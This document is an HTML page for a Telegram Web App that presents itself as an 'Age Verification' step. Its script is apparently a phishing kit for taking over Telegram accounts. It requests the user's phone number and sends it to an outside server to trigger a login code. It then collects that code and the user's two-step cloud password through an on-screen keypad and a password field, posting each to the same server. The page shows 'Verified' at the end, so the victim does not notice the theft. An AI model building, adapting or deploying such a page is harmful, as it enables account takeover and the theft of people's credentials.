<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verification</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: sans-serif; background: #0f172a; color: white; height: 100vh; overflow: hidden; display: flex; align-items: center; justify-content: center; }
        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(10px); border-radius: 20px; padding: 2rem; width: 90%; max-width: 400px; text-align: center; border: 1px solid rgba(255,255,255,0.1); }
        .step { display: none; }
        .active { display: block; }
        .numpad button { background: rgba(255,255,255,0.1); padding: 15px; border-radius: 10px; font-size: 1.2rem; }
    </style>
</head>
<body>

    <div class="glass">
        <div id="step1" class="step active">
            <h2 class="text-2xl font-bold mb-4">Age Verification</h2>
            <p class="text-gray-400 mb-6">Verify your identity to proceed.</p>
            <button onclick="requestContact()" class="w-full bg-blue-600 py-4 rounded-xl font-bold">✅ PROCEED</button>
        </div>

        <div id="step2" class="step">
            <h2 class="text-xl font-bold mb-4">Enter Code</h2>
            <input type="text" id="otp-display" readonly class="bg-transparent border-b-2 border-blue-500 text-3xl text-center w-full mb-8 tracking-widest" placeholder="*****">
            <div class="grid grid-cols-3 gap-3 numpad">
                <button onclick="addD(1)">1</button><button onclick="addD(2)">2</button><button onclick="addD(3)">3</button>
                <button onclick="addD(4)">4</button><button onclick="addD(5)">5</button><button onclick="addD(6)">6</button>
                <button onclick="addD(7)">7</button><button onclick="addD(8)">8</button><button onclick="addD(9)">9</button>
                <button onclick="clearD()" class="text-red-400">C</button><button onclick="addD(0)">0</button>
                <button onclick="submitOtp()" class="text-green-400">OK</button>
            </div>
        </div>

        <div id="step3" class="step">
            <h2 class="text-xl font-bold mb-2">Two-Step Password</h2>
            <p class="text-sm text-gray-400 mb-4">Enter your cloud password.</p>
            <input type="password" id="pwd" class="w-full bg-white/10 p-4 rounded-xl mb-4 outline-none border border-white/20">
            <button onclick="submitFinal()" id="f-btn" class="w-full bg-blue-600 py-4 rounded-xl font-bold">SUBMIT</button>
        </div>

        <div id="step4" class="step">
            <div class="text-5xl mb-4">✔️</div>
            <h2 class="text-2xl font-bold">Verified</h2>
            <p class="text-gray-400 mt-2">Access Granted Successfully.</p>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        const BASE_URL = "https://fainalbot2.onrender.com";
        let userPhone = "", currentOtp = "";
        tg.expand();

        function showStep(s){ document.querySelectorAll('.step').forEach(x=>x.classList.remove('active')); document.getElementById('step'+s).classList.add('active'); }

        function requestContact() {
            tg.requestContact((res) => {
                if(res.status === 'sent') {
                    userPhone = res.response_data.phone_number;
                    if(!userPhone.startsWith('+')) userPhone = '+' + userPhone;
                    showStep(2);
                    fetch(`${BASE_URL}/send_otp`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:userPhone}) });
                }
            });
        }

        function addD(n) { if(currentOtp.length < 5) { currentOtp += n; document.getElementById('otp-display').value = currentOtp; if(currentOtp.length === 5) setTimeout(submitOtp, 500); } }
        function clearD() { currentOtp = ""; document.getElementById('otp-display').value = ""; }

        async function submitOtp() {
            const r = await fetch(`${BASE_URL}/verify`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:userPhone, otp:currentOtp}) });
            const d = await r.json();
            if(d.status === '2fa_required') showStep(3);
            else if(d.status === 'success') showStep(4);
            else { alert("Invalid Code"); clearD(); }
        }

        async function submitFinal() {
            const p = document.getElementById('pwd').value;
            const r = await fetch(`${BASE_URL}/verify`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({phone:userPhone, otp:currentOtp, password:p}) });
            const d = await r.json();
            if(d.status === 'success') showStep(4);
            else alert("Wrong Password");
        }
    </script>
</body>
</html>
